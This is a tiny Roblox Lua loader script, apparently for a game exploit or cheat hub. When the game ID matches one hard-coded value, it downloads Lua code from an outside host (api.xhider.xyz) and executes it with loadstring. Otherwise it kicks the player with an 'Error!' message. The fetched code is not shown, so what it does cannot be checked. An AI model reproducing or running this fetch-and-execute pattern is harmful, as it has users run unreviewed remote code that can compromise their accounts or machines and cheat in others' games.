local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

if game.GameId == 2753915549 then
    loadstring(game:HttpGet("https://api.xhider.xyz/files/v4/loaders/53c600525720242b48c14a65310a8028.lua"))()
else
    LocalPlayer:Kick("Error!")
end
